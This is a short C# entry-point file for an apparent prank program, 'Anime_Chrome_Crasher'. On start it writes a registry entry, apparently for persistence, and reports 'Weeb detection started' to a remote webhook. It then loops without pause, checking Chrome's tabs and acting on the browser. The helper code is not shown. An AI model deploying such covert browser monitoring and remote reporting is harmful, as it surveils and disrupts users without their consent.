using System;
using System.Diagnostics;

namespace Anime_Chrome_Crasher
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 

        [STAThread]
        static void Main()
        {
            FindWindows.AddRegistry();
            WeebHook.SendMessage("Weeb detection started at " + DateTime.Now.ToString());
            while (true)
            {
                if (FindWindows.GetChrome())
                {
                    if (FindWindows.CheckTabs())
                    {
                        Process.Start("chrome");
                    }
                }
            }
        }
    }
}